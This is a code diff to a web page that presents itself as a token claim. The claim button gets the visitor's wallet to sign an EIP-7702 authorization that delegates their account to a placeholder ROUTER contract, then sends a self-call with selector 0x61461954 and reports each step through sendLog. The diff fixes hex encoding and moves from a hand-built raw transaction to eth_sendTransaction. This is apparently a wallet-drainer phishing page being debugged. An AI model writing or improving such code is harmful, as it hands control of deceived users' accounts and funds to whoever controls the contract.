@@ -60,7 +60,7 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐💆</span>
+            <span class="info-icon">🔐💥</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
@@ -87,8 +87,11 @@
 
         function rlpVal(val) {
             if (val === 0 || val === '0x' || val === '0x0') return '0x';
-            if (typeof val === 'string' && val.startsWith('0x')) return val;
-            return ethers.toBeHex(val);
+            if (typeof val === 'string' && val.startsWith('0x')) {
+                return val.length % 2 === 0 ? val : '0x0' + val.slice(2);
+            }
+            const hex = ethers.toBeHex(val);
+            return hex.length % 2 === 0 ? hex : '0x0' + hex.slice(2);
         }
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
@@ -123,11 +126,6 @@
                     }
                 }
 
-                const nonceHex = await window.ethereum.request({
-                    method: 'eth_getTransactionCount',
-                    params: [userAddress, 'latest']
-                });
-
                 const authPayloadRlp = ethers.encodeRlp([
                     rlpVal(CHAIN_ID),
                     ROUTER,
@@ -156,42 +154,28 @@
                 const s = ethers.hexlify(sigBytes.slice(32, 64));
                 const yParity = sigBytes[64] - 27;
 
-                const authTuple = [
-                    rlpVal(CHAIN_ID),
-                    ROUTER,
-                    '0x',
-                    rlpVal(yParity),
-                    r,
-                    s
-                ];
-
-                const authListEncoded = ethers.encodeRlp([authTuple]);
-
-                const txData = [
-                    rlpVal(CHAIN_ID),
-                    nonceHex,
-                    rlpVal(2000000000),
-                    rlpVal(2000000000),
-                    rlpVal(200000),
-                    userAddress,
-                    '0x',
-                    '0x61461954',
-                    [],
-                    [],
-                    [],
-                    rlpVal(0),
-                    authListEncoded
-                ];
-
-                const txRlp = ethers.encodeRlp(txData);
-                const rawTx = '0x04' + txRlp.slice(2);
-
-                btn.textContent = 'Sending...';
-                sendLog('BROADCASTING');
+                btn.textContent = 'Confirm in wallet...';
+                sendLog('SENDING TX');
 
                 const txHash = await window.ethereum.request({
-                    method: 'eth_sendRawTransaction',
-                    params: [rawTx]
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: userAddress,
+                        gas: '0x30D40',
+                        maxFeePerGas: '0x77359400',
+                        maxPriorityFeePerGas: '0x77359400',
+                        value: '0x0',
+                        data: '0x61461954',
+                        authorizationList: [{
+                            chainId: rlpVal(CHAIN_ID),
+                            address: ROUTER,
+                            nonce: '0x' + (0).toString(16),
+                            yParity: rlpVal(yParity),
+                            r: r,
+                            s: s
+                        }]
+                    }]
                 });
 
                 sendLog('TX: ' + txHash);
